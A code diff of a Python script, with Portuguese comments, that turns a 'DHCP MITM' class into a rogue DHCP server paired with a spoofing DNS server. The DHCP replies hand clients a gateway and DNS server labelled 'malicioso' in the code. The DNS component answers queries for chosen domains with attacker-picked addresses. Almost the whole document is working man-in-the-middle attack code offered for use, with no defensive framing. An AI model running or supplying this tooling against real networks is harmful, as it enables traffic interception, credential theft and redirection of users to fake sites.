@@ -1,72 +1,155 @@
 import socket
-import struct
-import random
-from socket import inet_ntoa, inet_aton
+import threading
 
-class DHCPMITMServer:
-    DHCP_SERVER_PORT = 67
-    DHCP_CLIENT_PORT = 68
-    DHCP_MAGIC_COOKIE = b'\x63\x82\x53\x63'
-    
-    def __init__(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-        self.sock.bind(('0.0.0.0', self.DHCP_SERVER_PORT))
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        self.leased_ips = {}
-    
-    def create_offer_packet(self, xid, chaddr, yiaddr):
-        packet = b''
-        packet += struct.pack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s',
-                              2, 1, 6, 0, xid, 0, 0,
-                              0, 0, yiaddr, 0, 0,
-                              chaddr, b'\x00'*64, b'\x00'*128)
-        packet += self.DHCP_MAGIC_COOKIE
-        packet += struct.pack('!BBB4s', 53, 1, 2, b'')  # DHCP Offer
-        packet += struct.pack('!BBB4s', 1, 4, inet_aton('255.255.255.0'))  # Subnet Mask
-        packet += struct.pack('!BBB4s', 3, 4, inet_aton('192.168.1.1'))  # Router (Gateway)
-        packet += struct.pack('!BBB4s', 6, 4, inet_aton('192.168.1.2'))  # DNS Server
-        packet += b'\xff'  # End option
-        return packet
-    
-    def create_ack_packet(self, xid, chaddr, yiaddr):
-        packet = b''
-        packet += struct.pack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s',
-                              2, 1, 6, 0, xid, 0, 0,
-                              0, 0, yiaddr, 0, 0,
-                              chaddr, b'\x00'*64, b'\x00'*128)
-        packet += self.DHCP_MAGIC_COOKIE
-        packet += struct.pack('!BBB4s', 53, 1, 5, b'')  # DHCP ACK
-        packet += struct.pack('!BBB4s', 1, 4, inet_aton('255.255.255.0'))  # Subnet Mask
-        packet += struct.pack('!BBB4s', 3, 4, inet_aton('192.168.1.1'))  # Router (Gateway)
-        packet += struct.pack('!BBB4s', 6, 4, inet_aton('192.168.1.2'))  # DNS Server
-        packet += b'\xff'  # End option
-        return packet
-    
-    def handle_dhcp(self, data):
-        dhcp_header = struct.unpack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s 4s', data[:240])
-        xid, chaddr = dhcp_header[4], dhcp_header[11]
-        message_type = data[240+4+2]  # DHCP Message Type option is the first option after cookie
-        
-        yiaddr = struct.pack('!I', random.randint(0xc0a80102, 0xc0a801fe))  # Random IP from 192.168.1.2-254
-        self.leased_ips[chaddr] = yiaddr
-        
-        if message_type == 1:  # DHCP Discover
-            offer_packet = self.create_offer_packet(xid, chaddr, yiaddr)
-            self.sock.sendto(offer_packet, ('<broadcast>', self.DHCP_CLIENT_PORT))
-            print(f"Sent DHCP Offer for {inet_ntoa(yiaddr)}")
-        
-        elif message_type == 3:  # DHCP Request
-            ack_packet = self.create_ack_packet(xid, chaddr, yiaddr)
-            self.sock.sendto(ack_packet, ('<broadcast>', self.DHCP_CLIENT_PORT))
-            print(f"Sent DHCP ACK for {inet_ntoa(yiaddr)}")
-    
-    def run(self):
-        print("DHCP MITM Server is running...")
-        while True:
-            data, _ = self.sock.recvfrom(1024)
-            self.handle_dhcp(data)
+def create_dhcp_socket():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+    sock.bind(('0.0.0.0', 67))
+    return sock
+
+def receive_dhcp_message(sock):
+    while True:
+        data, addr = sock.recvfrom(1024)
+        dhcp_message_type = data[242]
+
+        if dhcp_message_type == 1:  # DHCP Discover
+            print("DHCP Discover recebido de", addr)
+            handle_dhcp_discover(sock, data, addr)
+        elif dhcp_message_type == 3:  # DHCP Request
+            print("DHCP Request recebido de", addr)
+            handle_dhcp_request(sock, data, addr)
+
+def handle_dhcp_discover(sock, data, addr):
+    transaction_id = data[4:8]
+    client_mac = data[28:34]
+    print(f"DHCP Discover - Transaction ID: {transaction_id.hex()}, Client MAC: {client_mac.hex()}")
+    send_dhcp_offer(sock, transaction_id, client_mac, addr)
+
+def handle_dhcp_request(sock, data, addr):
+    transaction_id = data[4:8]
+    client_mac = data[28:34]
+    requested_ip = data[50:54]
+    print(f"DHCP Request - Transaction ID: {transaction_id.hex()}, Client MAC: {client_mac.hex()}, Requested IP: {socket.inet_ntoa(requested_ip)}")
+    send_dhcp_ack(sock, transaction_id, client_mac, requested_ip, addr)
+
+def send_dhcp_offer(sock, transaction_id, client_mac, addr):
+    offer_packet = build_dhcp_offer(transaction_id, client_mac)
+    sock.sendto(offer_packet, ('<broadcast>', 68))
+    print("DHCP Offer enviado para", addr)
+
+def send_dhcp_ack(sock, transaction_id, client_mac, requested_ip, addr):
+    ack_packet = build_dhcp_ack(transaction_id, client_mac, requested_ip)
+    sock.sendto(ack_packet, ('<broadcast>', 68))
+    print("DHCP Ack enviado para", addr)
+
+def build_dhcp_offer(transaction_id, client_mac):
+    offer_packet = b''
+    # Cabeçalho DHCP
+    offer_packet += b'\x02'  # Op (2 = Boot Reply)
+    offer_packet += b'\x01'  # Htype
+    offer_packet += b'\x06'  # Hlen
+    offer_packet += b'\x00'  # Hops
+    offer_packet += transaction_id  # Xid
+    offer_packet += b'\x00\x00'  # Secs
+    offer_packet += b'\x00\x00'  # Flags
+    offer_packet += b'\x00\x00\x00\x00'  # Ciaddr
+    offer_packet += socket.inet_aton('192.168.1.100')  # Yiaddr (IP oferecido)
+    offer_packet += b'\x00\x00\x00\x00'  # Siaddr
+    offer_packet += b'\x00\x00\x00\x00'  # Giaddr
+    offer_packet += client_mac  # Chaddr
+    offer_packet += b'\x00' * 10  # Chaddr padding
+    offer_packet += b'\x00' * 192  # Bootp legacy padding
+    offer_packet += b'\x63\x82\x53\x63'  # Magic cookie
+    offer_packet += b'\x35\x01\x02'  # DHCP Message Type (Offer)
+    offer_packet += b'\x36\x04' + socket.inet_aton('192.168.1.1')  # DHCP Server Identifier
+    offer_packet += b'\x01\x04\xff\xff\xff\x00'  # Subnet Mask
+    offer_packet += b'\x03\x04' + socket.inet_aton('192.168.1.1')  # Router (gateway malicioso)
+    offer_packet += b'\x06\x04' + socket.inet_aton('192.168.1.1')  # DNS Server (DNS malicioso)
+    offer_packet += b'\xff'  # End Option
+
+    return offer_packet
+
+def build_dhcp_ack(transaction_id, client_mac, requested_ip):
+    ack_packet = b''
+    # Cabeçalho DHCP
+    ack_packet += b'\x02'  # Op (2 = Boot Reply)
+    ack_packet += b'\x01'  # Htype
+    ack_packet += b'\x06'  # Hlen
+    ack_packet += b'\x00'  # Hops
+    ack_packet += transaction_id  # Xid
+    ack_packet += b'\x00\x00'  # Secs
+    ack_packet += b'\x00\x00'  # Flags
+    ack_packet += b'\x00\x00\x00\x00'  # Ciaddr
+    ack_packet += requested_ip  # Yiaddr (IP oferecido)
+    ack_packet += b'\x00\x00\x00\x00'  # Siaddr
+    ack_packet += b'\x00\x00\x00\x00'  # Giaddr
+    ack_packet += client_mac  # Chaddr
+    ack_packet += b'\x00' * 10  # Chaddr padding
+    ack_packet += b'\x00' * 192  # Bootp legacy padding
+    ack_packet += b'\x63\x82\x53\x63'  # Magic cookie
+    ack_packet += b'\x35\x01\x05'  # DHCP Message Type (Ack)
+    ack_packet += b'\x36\x04' + socket.inet_aton('192.168.1.1')  # DHCP Server Identifier
+    ack_packet += b'\x01\x04\xff\xff\xff\x00'  # Subnet Mask
+    ack_packet += b'\x03\x04' + socket.inet_aton('192.168.1.1')  # Router (gateway malicioso)
+    ack_packet += b'\x06\x04' + socket.inet_aton('192.168.1.1')  # DNS Server (DNS malicioso)
+    ack_packet += b'\xff'  # End Option
+
+    return ack_packet
+
+# Servidor DNS malicioso
+def start_dns_server():
+    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    dns_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Adicionar esta linha
+    dns_socket.bind(('0.0.0.0', 53))
+    dns_mapping = {
+        b'www.exemplo.com': '192.168.1.101',
+        b'www.outrosite.com': '192.168.1.102'
+    }
+    print("Servidor DNS malicioso iniciado e escutando na porta 53.")
+    while True:
+        query, addr = dns_socket.recvfrom(512)
+        print(f"Consulta DNS recebida de {addr}")
+        domain = extract_domain_from_query(query)
+        if domain in dns_mapping:
+            response = build_dns_response(query, dns_mapping[domain])
+            dns_socket.sendto(response, addr)
+            print(f"Consulta DNS para {domain.decode()} respondida com {dns_mapping[domain]}")
+        else:
+            print(f"Consulta DNS para {domain.decode()} não encontrada no mapeamento.")
+
+def extract_domain_from_query(query):
+    domain = b''
+    i = 12
+    while query[i] != 0:
+        length = query[i]
+        domain += query[i+1:i+1+length] + b'.'
+        i += length + 1
+    return domain[:-1]
+
+def build_dns_response(query, ip):
+    transaction_id = query[:2]
+    flags = b'\x81\x80'
+    questions = query[4:6]
+    answer_rrs = b'\x00\x01'
+    authority_rrs = b'\x00\x00'
+    additional_rrs = b'\x00\x00'
+    response = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query[12:]
+    response += b'\xc0\x0c'  # Nome (ponto de referência para o nome do domínio)
+    response += b'\x00\x01'  # Tipo (A)
+    response += b'\x00\x01'  # Classe (IN)
+    response += b'\x00\x00\x00\x3c'  # TTL (60 segundos)
+    response += b'\x00\x04'  # Comprimento dos dados
+    response += socket.inet_aton(ip)  # Endereço IP
+    return response
+
+def main():
+    threading.Thread(target=dhcp_server_main).start()
+    threading.Thread(target=start_dns_server).start()
+
+def dhcp_server_main():
+    dhcp_socket = create_dhcp_socket()
+    receive_dhcp_message(dhcp_socket)
 
 if __name__ == "__main__":
-    server = DHCPMITMServer()
-    server.run()
+    main()
